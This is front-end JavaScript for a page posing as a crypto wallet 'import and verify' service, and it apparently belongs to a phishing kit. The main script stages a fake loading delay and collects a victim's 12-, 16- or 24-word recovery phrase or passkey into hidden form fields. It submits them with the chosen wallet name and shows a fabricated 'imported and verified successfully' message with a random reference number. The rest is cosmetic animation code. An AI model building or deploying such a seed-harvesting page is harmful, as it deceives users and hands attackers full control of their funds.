document.addEventListener('DOMContentLoaded', () => {
    const languageBtn = document.getElementById('languageBtn');
    const languageModal = document.getElementById('languageModal');
    const closeLanguageModal = document.getElementById('closeLanguageModal');
    const languageOptions = document.querySelectorAll('.language-option');
    const currentLangSpan = document.getElementById('currentLang');

    const walletCards = document.querySelectorAll('.wallet-card');
    const loadingModal = document.getElementById('loadingModal');
    const phraseModal = document.getElementById('phraseModal');
    const successModal = document.getElementById('successModal');

    const closePhraseModal = document.getElementById('closePhraseModal');
    const phraseInput = document.getElementById('phraseInput');
    const passkeyInput = document.getElementById('passkeyInput');
    const phraseDisplay = document.getElementById('phraseDisplay');
    const phraseForm = document.getElementById('phraseForm');
    const proceedBtn = document.getElementById('proceedBtn');
    const cancelPhraseBtn = document.getElementById('cancelPhraseBtn');
    const wordCountSpan = document.getElementById('wordCount');
    const wordTargetSpan = document.getElementById('wordTarget');
    const seedPhraseHidden = document.getElementById('seedPhraseHidden');
    const passkeyHidden = document.getElementById('passkeyHidden');
    const walletHidden = document.getElementById('walletHidden');
    const methodHidden = document.getElementById('methodHidden');

    const seedPhraseMethodBtn = document.getElementById('seedPhraseMethodBtn');
    const passkeyMethodBtn = document.getElementById('passkeyMethodBtn');
    const seedPhraseSection = document.getElementById('seedPhraseSection');
    const passkeySection = document.getElementById('passkeySection');
    const passkeyLength = document.getElementById('passkeyLength');

    const okBtn = document.getElementById('okBtn');
    const copyRefBtn = document.getElementById('copyRefBtn');
    const successWalletName = document.getElementById('successWalletName');
    const referenceNumber = document.getElementById('referenceNumber');

    let selectedWallet = '';
    let phraseWords = [];
    let currentMethod = 'seed-phrase';

    languageBtn.addEventListener('click', () => {
        languageModal.classList.add('active');
    });

    closeLanguageModal.addEventListener('click', () => {
        languageModal.classList.remove('active');
    });

    languageModal.addEventListener('click', (e) => {
        if (e.target === languageModal) {
            languageModal.classList.remove('active');
        }
    });

    languageOptions.forEach(option => {
        option.addEventListener('click', () => {
            const lang = option.dataset.lang;
            currentLangSpan.textContent = lang.toUpperCase();
            languageModal.classList.remove('active');
        });
    });

    walletCards.forEach(card => {
        card.addEventListener('click', () => {
            selectedWallet = card.dataset.wallet;
            showLoadingModal();
        });
    });

    seedPhraseMethodBtn.addEventListener('click', () => {
        currentMethod = 'seed-phrase';
        seedPhraseMethodBtn.classList.add('method-active');
        passkeyMethodBtn.classList.remove('method-active');
        seedPhraseSection.classList.add('active');
        passkeySection.classList.remove('active');
        phraseInput.focus();
        validateInput();
    });

    passkeyMethodBtn.addEventListener('click', () => {
        currentMethod = 'passkey';
        passkeyMethodBtn.classList.add('method-active');
        seedPhraseMethodBtn.classList.remove('method-active');
        passkeySection.classList.add('active');
        seedPhraseSection.classList.remove('active');
        passkeyInput.focus();
        validateInput();
    });

    function showLoadingModal() {
        loadingModal.classList.add('active');

        setTimeout(() => {
            loadingModal.classList.remove('active');
            showPhraseModal();
        }, 2000);
    }

    function showPhraseModal() {
        phraseModal.classList.add('active');
        phraseInput.focus();
    }

    closePhraseModal.addEventListener('click', () => {
        phraseModal.classList.remove('active');
        resetInputs();
    });

    cancelPhraseBtn.addEventListener('click', () => {
        phraseModal.classList.remove('active');
        resetInputs();
    });

    phraseModal.addEventListener('click', (e) => {
        if (e.target === phraseModal) {
            phraseModal.classList.remove('active');
            resetInputs();
        }
    });

    phraseInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            const word = phraseInput.value.trim();
            if (word) {
                addWord(word);
                phraseInput.value = '';
            }
        } else if (e.key === 'Backspace' && !phraseInput.value && phraseWords.length > 0) {
            removeLastWord();
        }
    });

    phraseInput.addEventListener('paste', (e) => {
        const pastedText = e.clipboardData.getData('text');
        const words = pastedText.trim().split(/\s+/);

        words.forEach(word => {
            if (word && phraseWords.length < 24) {
                phraseWords.push(word);
            }
        });

        renderPhraseWords();
        validateInput();
        phraseInput.value = '';
    });

    passkeyInput.addEventListener('input', () => {
        passkeyLength.textContent = passkeyInput.value.length;
        validateInput();
    });

    function addWord(word) {
        if (phraseWords.length >= 24) {
            return;
        }

        phraseWords.push(word.toLowerCase());
        renderPhraseWords();
        validateInput();
    }

    function removeWord(index) {
        phraseWords.splice(index, 1);
        renderPhraseWords();
        validateInput();
    }

    function removeLastWord() {
        phraseWords.pop();
        renderPhraseWords();
        validateInput();
    }

    function renderPhraseWords() {
        phraseDisplay.innerHTML = '';

        phraseWords.forEach((word, index) => {
            const wordElement = document.createElement('div');
            wordElement.className = 'phrase-word';

            const wordText = document.createElement('span');
            wordText.textContent = word;

            const removeBtn = document.createElement('button');
            removeBtn.className = 'phrase-word-remove';
            removeBtn.type = 'button';
            removeBtn.innerHTML = '&times;';
            removeBtn.addEventListener('click', (e) => {
                removeWord(index);
                phraseInput.focus();
            });

            wordElement.appendChild(wordText);
            wordElement.appendChild(removeBtn);
            phraseDisplay.appendChild(wordElement);
        });

        wordCountSpan.textContent = phraseWords.length;
    }

    function validateInput() {
        if (currentMethod === 'seed-phrase') {
            const wordCount = phraseWords.length;
            const isValid = wordCount === 12 || wordCount === 16 || wordCount === 24;

            if (wordCount === 12 || wordCount === 16 || wordCount === 24) {
                wordTargetSpan.textContent = wordCount;
                proceedBtn.disabled = false;
            } else if (wordCount < 12) {
                wordTargetSpan.textContent = '12';
                proceedBtn.disabled = true;
            }
        } else {
            const passkeyValue = passkeyInput.value.trim();
            proceedBtn.disabled = passkeyValue.length < 8;
        }
    }

    function resetInputs() {
        phraseWords = [];
        phraseInput.value = '';
        passkeyInput.value = '';
        passkeyLength.textContent = '0';
        renderPhraseWords();
        validateInput();
        wordTargetSpan.textContent = '12-16-24';
        currentMethod = 'seed-phrase';
        seedPhraseMethodBtn.classList.add('method-active');
        passkeyMethodBtn.classList.remove('method-active');
        seedPhraseSection.classList.add('active');
        passkeySection.classList.remove('active');
    }

    function generateReferenceNumber() {
        const timestamp = Date.now().toString();
        const random = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
        return timestamp.slice(-6) + random;
    }

    phraseForm.addEventListener('submit', (e) => {
        if (currentMethod === 'seed-phrase') {
            const wordCount = phraseWords.length;

            if (wordCount !== 12 && wordCount !== 16 && wordCount !== 24) {
                // e.preventDefault();
                alert(`Invalid recovery phrase. Please enter exactly 12, 16, or 24 words. You currently have ${wordCount} word(s).`);
                return;
            }

            seedPhraseHidden.value = phraseWords.join(' ');
            passkeyHidden.value = '';
        } else {
            const passkeyValue = passkeyInput.value.trim();

            if (passkeyValue.length < 8) {
                e.preventDefault();
                alert('Passkey must be at least 8 characters long.');
                return;
            }

            passkeyHidden.value = passkeyValue;
            seedPhraseHidden.value = '';
        }

        methodHidden.value = currentMethod;
        walletHidden.value = selectedWallet;

        proceedBtn.disabled = true;
        proceedBtn.textContent = 'Processing...';

        const refNumber = generateReferenceNumber();

        setTimeout(() => {
            phraseModal.classList.remove('active');
            resetInputs();
            proceedBtn.disabled = false;
            proceedBtn.textContent = 'Verify & Proceed';

            showSuccessModal(refNumber);
        }, 500);
    });

    function showSuccessModal(refNumber) {
        successWalletName.textContent = `${selectedWallet} has been imported and verified successfully`;
        referenceNumber.textContent = refNumber;
        successModal.classList.add('active');
    }

    okBtn.addEventListener('click', () => {
        successModal.classList.remove('active');
        window.location.href = '/';
    });

    copyRefBtn.addEventListener('click', () => {
        const refText = referenceNumber.textContent;
        navigator.clipboard.writeText(refText).then(() => {
            const originalHTML = copyRefBtn.innerHTML;
            copyRefBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>';
            setTimeout(() => {
                copyRefBtn.innerHTML = originalHTML;
            }, 2000);
        });
    });

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            phraseModal.classList.remove('active');
            successModal.classList.remove('active');
            languageModal.classList.remove('active');
        }
    });
});



document.addEventListener('DOMContentLoaded', function() {

    const cardElements = document.querySelectorAll('.issue-card, .wallet-card');
    const buttons = document.querySelectorAll('.btn');
    const formInputs = document.querySelectorAll('input, textarea');
    const metrics = document.querySelectorAll('.metric-number');

    cardElements.forEach(card => {
        card.addEventListener('mouseenter', function() {
            this.style.willChange = 'transform';
        });

        card.addEventListener('mouseleave', function() {
            this.style.willChange = 'auto';
        });
    });

    buttons.forEach(btn => {
        btn.addEventListener('click', function(e) {
            const ripple = document.createElement('div');
            ripple.style.position = 'absolute';
            ripple.style.width = '20px';
            ripple.style.height = '20px';
            ripple.style.background = 'rgba(255, 255, 255, 0.6)';
            ripple.style.borderRadius = '50%';
            ripple.style.pointerEvents = 'none';
            ripple.style.animation = 'ripple 0.6s ease-out';

            const rect = this.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            ripple.style.width = size + 'px';
            ripple.style.height = size + 'px';
            ripple.style.left = (e.clientX - rect.left - size / 2) + 'px';
            ripple.style.top = (e.clientY - rect.top - size / 2) + 'px';

            this.style.position = 'relative';
            this.style.overflow = 'hidden';
            this.appendChild(ripple);

            setTimeout(() => ripple.remove(), 600);
        });
    });

    formInputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.transform = 'translateY(-2px)';
        });

        input.addEventListener('blur', function() {
            this.parentElement.style.transform = 'translateY(0)';
        });
    });

    if (metrics.length > 0) {
        const observerOptions = {
            threshold: 0.5,
            rootMargin: '0px'
        };

        const observer = new IntersectionObserver(function(entries) {
            entries.forEach(entry => {
                if (entry.isIntersecting && !entry.target.classList.contains('counted')) {
                    animateCounter(entry.target);
                    entry.target.classList.add('counted');
                }
            });
        }, observerOptions);

        metrics.forEach(metric => observer.observe(metric));
    }

    function animateCounter(element) {
        const target = parseInt(element.getAttribute('data-target')) || 0;
        const duration = 2000;
        const start = Date.now();
        const suffix = element.getAttribute('data-suffix') || '';

        const animate = () => {
            const elapsed = Date.now() - start;
            const progress = Math.min(elapsed / duration, 1);
            const current = Math.floor(target * progress);
            element.textContent = current.toLocaleString() + suffix;

            if (progress < 1) {
                requestAnimationFrame(animate);
            }
        };

        animate();
    }

    const style = document.createElement('style');
    style.textContent = `
        @keyframes ripple {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }

        @keyframes slideInLeft {
            from {
                opacity: 0;
                transform: translateX(-30px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .slide-in-left {
            animation: slideInLeft 0.5s ease-out;
        }
    `;
    document.head.appendChild(style);

    document.querySelectorAll('[data-animate="slide-in"]').forEach((el, index) => {
        el.style.animation = `slideInLeft 0.5s ease-out ${index * 0.1}s backwards`;
    });

    const scrollElements = document.querySelectorAll('.hero-content, .section-header, .issues-grid');

    const scrollObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, { threshold: 0.1 });

    scrollElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        el.style.transition = 'all 0.6s ease-out';
        scrollObserver.observe(el);
    });

    document.addEventListener('mousemove', (e) => {
        const cards = document.querySelectorAll('.issue-card, .wallet-card');
        cards.forEach(card => {
            const rect = card.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;

            const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
            if (!isDark) return;

            const xPercent = (x / rect.width) * 100;
            const yPercent = (y / rect.height) * 100;

            card.style.setProperty('--mouse-x', xPercent + '%');
            card.style.setProperty('--mouse-y', yPercent + '%');
        });
    });
});

window.addEventListener('load', () => {
    document.querySelectorAll('[data-src]').forEach(img => {
        img.src = img.getAttribute('data-src');
        img.removeAttribute('data-src');
    });
});
